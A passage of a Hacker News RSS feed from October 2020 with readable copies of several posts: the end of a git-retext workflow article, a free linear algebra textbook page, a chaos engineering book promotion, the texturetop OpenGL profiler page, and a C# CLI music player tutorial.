 src/main.rs | 3 +++
 1 file changed, 3 insertions(+)

diff --git a/src/main.rs b/src/main.rs
index de5aba608ec3..d2741fa61fe2 100644
--- a/src/main.rs
+++ b/src/main.rs
@@ -161,6 +161,9 @@ impl Game {

         self.falling = self.possible_pieces[idx].clone();
         self.shift = (0, 0);
+        for _ in 0 .. rng.gen_range(0, 4usize) {
+            self.rotate(false)
+        }
     }

     fn render(&amp;self, window: &amp;mut PistonWindow, event: &amp;Event) {
--
2.26.2
</span></pre></div></div>
<p>This is how a commit looks like when it is sent by email. It is possible to
edit the first line of the commit in the <code>Subject: </code> ; and the details of the
commit message before the <code>---</code>, and the diff itself. About the diff, we don't
have to fix the unidiff's meta-data, because <code>git-retext</code>'s processing will
take care of it instead.</p>
<p>Saving the temporary and exiting, <code>git-retext</code> will try to apply the edited
commits using <code>git am</code>. If we have carefully edited them, they should
apply cleanly. The resultant <code>HEAD</code> is the edited history.</p>
<p>Of course, this new method is not perfect, but it's a time saver for certain
set of editing activities. After getting accustomed to it, you may start
reviewing changes in <code>git-retext</code> even if you are not ending up modifying them,
instead of running <code>git-diff</code> or viewing a diff made by the editor environment.</p>
<h2 id="advantages">Advantages</h2>
<ul>
<li>Easy to amend changes right when they are being reviewed, as long as
the editing is not too complicated. Adding new diff lines inside hunks
is possible.</li>
<li>Easy to do search and replace on the changes themselves, and that also takes
care of the commit message, and added filenames if relevant.</li>
<li>It is possible to remove unwanted diff hunks.</li>
<li>Splitting of commits to small new commits is possible by adding a new email
header in between hunks (no need to edit the diffstat).</li>
</ul>
<h2 id="disadvantages">Disadvantages</h2>
<ul>
<li>If there is more than one commit and they are dependent on one another, we
must be more careful so that the editing is consistent, and that the diff hunk
context is correct.</li>
<li>It's easy to mess up the editing and discover the mess only when <code>git-retext</code>
fails to apply the changes.</li>
</ul>
<p>Future enhancements of <code>git-retext</code> should assist in avoiding mistakes during
editing, perhaps with better editor integration.</p>

<p><code>git-retext</code> is Python 3 script that relies on <code>recountdiff</code> in order to fix
the edited diffs. The underlying git commands being used are
<code>git-format-patch</code>, <code>git-am</code>, and <code>git-reset</code>.</p>

    </div>

    
    

    

    
    
</article>




            </div></div></div>]]>
            </description>
            <link>https://blog.aloni.org/posts/gitology-2-git-retext/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24893024</guid>
            <pubDate>Mon, 26 Oct 2020 05:14:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Build your own isometric city]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 40 (<a href="https://news.ycombinator.com/item?id=24892956">thread link</a>) | @atum47
<br/>
October 25, 2020 | https://victorribeiro.com/tileEditor/?example=01 | <a href="https://web.archive.org/web/*/https://victorribeiro.com/tileEditor/?example=01">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://victorribeiro.com/tileEditor/?example=01</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892956</guid>
            <pubDate>Mon, 26 Oct 2020 04:58:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free Linear Algebra textbook]]>
            </title>
            <description>
<![CDATA[
Score 348 | Comments 74 (<a href="https://news.ycombinator.com/item?id=24892907">thread link</a>) | @swatson741
<br/>
October 25, 2020 | https://hefferon.net/linearalgebra/ | <a href="https://web.archive.org/web/*/https://hefferon.net/linearalgebra/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      <div id="innercontent">
	<p><img id="cover" src="https://hefferon.net/linearalgebra/cover.png" alt="cover of Linear Algebra by Hefferon"></p><p>
	  <a href="http://joshua.smcvt.edu/linearalgebra/book.pdf"><i>Linear Algebra</i></a> by Jim Hefferon,
	  along with its 
	  <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">answers to exercises</a>, 
	  is a text for a first undergraduate course.
	  It is Free.
	  Use it as the main book, as a supplement, or for independent study.
	</p>

	<h3>
	  Highlights
	</h3>
	
	<ul>
	  <li><span>Standard coverage</span>
            Linear systems and Gauss's method, 
	    vector spaces, linear maps and matrices, determinants,
	    and eigenvectors and eigenvalues.
          </li>
	  
	  <li><span>Developmental approach</span>
	    The book proves all of the results
	    but does not start by assuming that 
	    students are already able at abstract work.
	    Instead, it proceeds with a great deal of
	    motivation, many computational examples, 
            and many exercises.
	    The goal is to raise 
            each student's level of 
	    mathematical maturity.
          </li>
	  
	  <li><span>Extensive exercise sets</span>   
            Each subsection has a wide range of exercises,
            from 
	    routine verifications to a few challenges.
	    The
	    <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">solution book</a>
	    has each answer completely worked.
	    In addition, clicking on a problem 
	    takes you to its answer
	    while clicking on the answer takes you back to the problem.
          </li>
	  
	  <li><span>Popular</span>
	    Used in hundreds of classes at many schools, 
            as well as by thousands of people
            for independent study.
          </li>
	  
	  <li><span>Applications</span>
            Each chapter finishes with four or five short  
	    supplemental topics
            for reading or projects, or for
            small group work. 
          </li> 
	  
	  <li><span>Extras</span>
            There are <a href="https://hefferon.net/linearalgebra/teaching.html">beamer slides</a>
	    for classroom presentations, 
            a
	    <a href="https://hefferon.net/linearalgebra/teaching.html">lab manual</a> using
	    <a href="https://www.sagemath.org/"><i>Sage</i></a>,
	    and <a href="https://www.youtube.com/playlist?list=PLwF3A0R8OzMoMlE1-SaEh8h9VqUlO-r52">videos</a>.
          </li> 
	  
	  <li><span>Prerequisite</span>
            One semester of calculus.
          </li>
	  
	  <li><span>Free</span>
            Everything is 
	    <a href="https://hefferon.net/source.html">Freely available</a>,
	    including the
	    <a href="https://gitlab.com/jim.hefferon/linear-algebra"><span>L<sup>a</sup>T<sub>e</sub>X</span> source</a>.
	    You can also buy a
	    <a href="https://hefferon.net/linearalgebra/hardcopy.html">paper copy of the book</a>.
          </li>
	  
	  <li><span>Reviews</span>
            Some from:
            <a href="http://mathdl.maa.org/mathDL/19/?pa=reviews&amp;sa=viewBook&amp;bookId=72055">the Mathematical Association of America</a>,
            <a href="https://open.umn.edu/opentextbooks/textbooks/24">the American Institute of Mathematics</a>,
            <a href="https://open.umn.edu/opentextbooks/BookDetail.aspx?bookId=24">the Open Textbook Library</a>,
            <a href="http://www.theassayer.org/cgi-bin/asbook.cgi?book=29"><i>The Assayer</i>, a longstanding site about free texts</a>.
          </li>
	  
	  <li><span>Award winning</span>
            Recipient of the 2020 Solow Award
	    from the Mathematical Association of America, for
	    “impact on undergraduate education in mathematics.”
          </li>
	</ul>
      </div>
    </div></div>]]>
            </description>
            <link>https://hefferon.net/linearalgebra/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892907</guid>
            <pubDate>Mon, 26 Oct 2020 04:46:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Chaos Engineering Book]]>
            </title>
            <description>
<![CDATA[
Score 234 | Comments 30 (<a href="https://news.ycombinator.com/item?id=24892874">thread link</a>) | @talonx
<br/>
October 25, 2020 | https://www.verica.io/the-chaos-engineering-book/ | <a href="https://web.archive.org/web/*/https://www.verica.io/the-chaos-engineering-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
					
					<div>
						<p>
							By Casey Rosenthal | October 6, 2020						</p>
						
						<p><span>12 minute read </span></p>
					</div>
										<p><img width="1000" height="600" src="https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2.jpg" alt="" loading="lazy" srcset="https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2.jpg 1000w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-300x180.jpg 300w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-768x461.jpg 768w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-50x30.jpg 50w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-400x240.jpg 400w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-600x360.jpg 600w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-660x396.jpg 660w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-800x480.jpg 800w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-960x576.jpg 960w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-327x196.jpg 327w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-654x392.jpg 654w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-260x156.jpg 260w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-520x312.jpg 520w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-417x250.jpg 417w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-778x467.jpg 778w" sizes="(max-width: 1000px) 100vw, 1000px">						<span></span>
					</p>
					
<p>I was hired at Netflix to lead the Traffic Team in early 2015. A few weeks later I was also asked to charter a Chaos Engineering Team. At the time, Chaos Engineering was essentially a program called Chaos Monkey with a few supporting blog posts. I wanted to get a feel for what our engineers thought about the practice, so I asked around: “What is Chaos Engineering?” The response I usually heard was, “Oh, that’s when we break stuff in production.”</p>



<p>As cool as that sounds, I could break stuff in production all day long and not provide any value to Netflix. I wanted to keep my job, not cause pointless havoc. So instead, I sat down with my team and defined Chaos Engineering as a proactive discipline to improve availability. We borrowed heavily from the field of Resilience Engineering and other research outside of the software industry to frame a practice of experimentation that follows in the best traditions of western science. Our definition is still published at <a href="http://principlesofchaos.org/" target="_blank" rel="noreferrer noopener">http://principlesofchaos.org/</a>. The point of Chaos Engineering isn’t to create chaos; it’s to chart a path of confidence through the chaos.</p>



<p>Working at Netflix was a highlight of my journey with Chaos Engineering. Another is co-authoring and publishing “Chaos Engineering: System Resiliency in Practice” with Nora Jones (Jeli.io). And now I am thrilled to have the opportunity to give away free e-copies of my book.</p>



<h2>Why Chaos Engineering is So Important Now</h2>



<p>Remote communication is literally saving lives during the pandemic. Never before have so many people relied on digital infrastructure to perform even basic tasks like getting food. The massive migration to remote work and remote education has irrevocably changed the course of societal structures, norms, and communication.</p>



<p>Work and school for hundreds of millions of people moved online in a matter of weeks. This is a monumental change to the most complex sociotechnical system we will ever be a part of. We don’t have access to a control group in this experiment. We only have one shot to get this right. The stakes are high.</p>



<p>With high stakes comes the opportunity for high value. The safety and reliability of the digital systems that we are suddenly so dependent on has never been more obvious. We have the opportunity and the responsibility to innovate in the areas of availability and security, to make these systems better in ways that matter to people.</p>



<p>The old methods won’t cut it. They aren’t bad, but they aren’t sufficient. Incident response management, alerting, metrics/logging, disaster recovery—all great, but also all reactive. They focus on time-to-detect and time-to-remediate. We need proactive methods. TDD, pair programming, peer code reviews, syntax scanning, QA—also great, but they won’t move the needle on availability or security in a complex system. You can’t expect a human to provide safety guarantees on something (a complex distributed system) that by definition is beyond the capability of a human to mentally model.</p>



<p>Chaos Engineering is a proactive approach to improving the safety properties of complex systems. We have an imperative to lean into these new, innovative approaches to help us cope with the increasing complexity and stress that our organizations are in. If you feel like your organization is facing unprecedented demands and requirements from a reliability perspective, you are in good company: most of us operating systems at scale are in that same position. With Chaos Engineering, you have an opportunity to meet those demands and navigate that complexity.</p>



<h2><strong>In the Book</strong></h2>



<p>This book explains where Chaos Engineering came from and provides some mental models to challenge the current mainstream thinking on system reliability. We then provide chapters contributed by authors from Slack, Google, Microsoft, LinkedIn, and CapitalOne, so that you can hear in their own words how people responsible for critical systems at scale are embracing Chaos Engineering to meet the challenges of the day. We also explore a bit outside of the typical boundaries of distributed software engineering to take a look at the future of the practice as well as its impact in manufacturing, autonomous vehicles, human systems, cyber security, and Continuous Verification.</p>



<h2><strong>We Want You to Have the Book… for Free</strong></h2>



<p>Nora and I wrote the most comprehensive, practical guide to Chaos Engineering. We even dedicated an entire chapter to establishing ROI so that you can see how Chaos Engineering has a positive effect. </p>



<p>Now Verica is sponsoring this book so that we can send you a digital copy for free. As a company, we believe the concepts explored within have the potential to completely change for the better how people build, operate, and maintain systems at scale. To get your free copy, go to <a href="https://www.verica.io/book/">verica.io/book</a>.</p>



<hr>



<div><figure><a href="https://www.verica.io/book/"><img src="https://vericadev.wpengine.com/wp-content/uploads/Button-for-Blogs-1024x614.jpg" alt=""></a></figure><div>
<p><strong>From us, to you</strong></p>



<p>If you liked this article, we think you’d love the official book on Chaos Engineering “Chaos Engineering, System Resiliency in Practice” by Casey Rosenthal and Nora Jones.</p>



<p><span><a href="https://www.verica.io/book/">GET YOUR FREE COPY</a></span></p>
</div></div>
					<!-- <div class="importent-content">
						<div class="half-content">
							<p>
								“A new practice is emerging that builds on the advantages established by CI/CD.
								Continuous Verification (CV) often manifests as a stage in a pipeline, but it can
								also run independently during business hours, verifying assumptions about the
								behavior of a system. Much like Chaos Engineering, CV platforms can include
								Availability or Security components and often express these as hypotheses. Like
								CI/CD, the practice is born out of a need to navigate increasingly complex systems.
								Organizations do not have the time or other resources to validate that the internal
								machinations of the system work as intended, so instead they verify that the output
								of the system is inline with expectations. This is the preference for verification
								over validation that hallmarks successful management of complex systems.”
							</p>
						</div>
						<p>
							There are many properties of a complex system that cannot be designed in the traditional
							sense, but that a business still needs to optimize. Take availability as an example.
							There are many approaches to improving availability. Some examples include: Incident
							Management, Alerting, Service Degradation, Observability Instrumentation, Disaster
							Recovery, Postmortem Facilitation, etc. What all of these approaches have in common is
							that they are aimed at improving time to detection (TTD) and time to remediation (TTR)
							of an incident. They are all reactive.
						</p>
						<p>
							When we sat down to define Chaos Engineering, we set out to build a discipline that was
							proactive. Chaos Engineering draws from the rich history of empirical experimentation to
							proactively discover vulnerabilities in complex systems. The culmination of this was the
							Chaos Automation Platform (ChAP) built by my team at Netflix.
						</p>
					</div> -->

				</div></div>]]>
            </description>
            <link>https://www.verica.io/the-chaos-engineering-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892874</guid>
            <pubDate>Mon, 26 Oct 2020 04:38:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Texturetop – Texture Profiling (2004)]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24892869">thread link</a>) | @pabs3
<br/>
October 25, 2020 | https://fishsoup.net/software/texturetop/ | <a href="https://web.archive.org/web/*/https://fishsoup.net/software/texturetop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      
      <p>
	One of the big determinants of OpenGL performance is texture
	usage; if an application starts using more textures than fit
	into the graphics card memory, performance can drop
	dramatically.
      </p>
      <p>
	texturetop is something I cooked up to allow easily getting a
	view of the texture usage of a client using the open-source
	Mesa/DRI implementation of libGL. It consists of two pieces;
	a patch for Mesa that provides a generic texture profiling
	hook and a small text mode client along the lines of the
	classic 'top' that uses the profiling hook.
      </p>
      <p>
	The way that the texture profiling hook works is that if an
	environment variable LIBGL_PROFILE_SERVER is set, a separate
	thread is created that connects to the specified profiling
	server and waits for commands for the server. The only command
	at the current time (other than startup/shutdown) is a request
	for changes to the current state since the last update.
      </p>
      <p>
	Some small driver modifications are needed to hook up to this
	profiling infrastructure. In the current version of the patch,
	only the Savage driver is modified, so it probably won't
	do anything for your video card without a little work.
      </p>
      <p>
	The information that texturetop displays is:
      </p>
      <ul>
	<li>Number and size of available texture heaps (Card, AGP,
	etc.)</li>
	<li>For each texture
	  <ul>
	    <li>Width and height of the texture</li>
	    <li>Bytes used in main client memory</li>
	    <li>Current heap for the texture, if any</li>
	    <li>Time texture has been in that heap</li>
	    <li>Bytes used in that heap</li>
	  </ul>
	</li>
      </ul>
      
      <h2> Download </h2>
      <ul>
	<li> <a href="https://fishsoup.net/software/texturetop/texturetop-1.1.tar.gz">texturetop-1.1.tar.gz</a></li>
	<li> <a href="https://fishsoup.net/software/texturetop/README">texturetop README</a></li>
	<li> <a href="https://fishsoup.net/software/texturetop/Mesa-texprof-0.2.patch.gz">Mesa
	patch</a></li>
	<li> <a href="https://fishsoup.net/software/texturetop/README.texprof">README from Mesa patch</a></li>
      </ul>
      
            
<!--
Local variables:
mode: xml
sgml-parent-document: ("index.html" "div" "div" "")
End:
-->

    </div></div>]]>
            </description>
            <link>https://fishsoup.net/software/texturetop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892869</guid>
            <pubDate>Mon, 26 Oct 2020 04:37:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Developing a CLI Music Player in C# using Terminal.Gui]]>
            </title>
            <description>
<![CDATA[
Score 137 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24892637">thread link</a>) | @sanesmith
<br/>
October 25, 2020 | https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/ | <a href="https://web.archive.org/web/*/https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" width="366" height="302" alt="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

<div><div><pre><code><span>namespace</span> <span>MusicSharp</span>
<span>{</span>
    <span>using</span> <span>Terminal.Gui</span><span>;</span>

    <span>/// &lt;summary&gt;</span>
    <span>/// The Gui class houses the CLI elements of MusicSharp.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>class</span> <span>Gui</span>
    <span>{</span>
        <span>/// &lt;summary&gt;</span>
        <span>/// The Start method builds the user interface.</span>
        <span>/// &lt;/summary&gt;</span>
        <span>public</span> <span>void</span> <span>Start</span><span>()</span>
        <span>{</span>
            <span>// Creates a instance of MainLoop to process input events, handle timers and other sources of data.</span>
            <span>Application</span><span>.</span><span>Init</span><span>();</span>

            <span>var</span> <span>top</span> <span>=</span> <span>Application</span><span>.</span><span>Top</span><span>;</span>
            <span>var</span> <span>tframe</span> <span>=</span> <span>top</span><span>.</span><span>Frame</span><span>;</span>

            <span>// Create the top-level window.</span>
            <span>var</span> <span>win</span> <span>=</span> <span>new</span> <span>Window</span><span>(</span><span>"MusicSharp"</span><span>)</span>
            <span>{</span>
                <span>X</span> <span>=</span> <span>0</span><span>,</span>
                <span>Y</span> <span>=</span> <span>1</span><span>,</span> <span>// Leave one row for the toplevel menu</span>

                <span>// By using Dim.Fill(), it will automatically resize without manual intervention</span>
                <span>Width</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>(),</span>

                <span>// Subtract one row for the statusbar</span>
                <span>Height</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>()</span> <span>-</span> <span>1</span><span>,</span>
            <span>};</span>
            <span>});</span>

            <span>// Add the layout elements and run the app.</span>
            <span>top</span><span>.</span><span>Add</span><span>(</span><span>win</span><span>);</span>
            <span>Application</span><span>.</span><span>Run</span><span>();</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" width="750" height="402" alt="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_About"</span><span>,</span> <span>string</span><span>.</span><span>Empty</span><span>,</span> <span>()</span> <span>=&gt;</span>
        <span>{</span>
            <span>MessageBox</span><span>.</span><span>Query</span><span>(</span><span>"Music Sharp 0.2.0"</span><span>,</span> <span>"\nMusic Sharp is a lightweight CLI\n music player written in C#.\n\nDeveloped by Mark-James McDougall\nand licensed under the GPL v3.\n "</span><span>,</span> <span>"Close"</span><span>);</span>
        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" width="750" height="446" alt="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" width="750" height="446" alt="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" width="750" height="473" alt="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to stay tuned for part two of this guide, as we will refactor our current code to make it easier to test and more loosely coupled using Interfaces and Dependency Injection!</p>

      </article></div>]]>
            </description>
            <link>https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892637</guid>
            <pubDate>Mon, 26 Oct 2020 03:42:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Intuition for Lisp Syntax]]>
            </title>
            <description>
<![CDATA[
Score 538 | Comments 193 (<a href="https://news.ycombinator.com/item?id=24892297">thread link</a>) | @simonpure
<br/>
October 25, 2020 | https://stopa.io/post/265 | <a href="https://web.archive.org/web/*/https://stopa.io/post/265">archive.org</a>
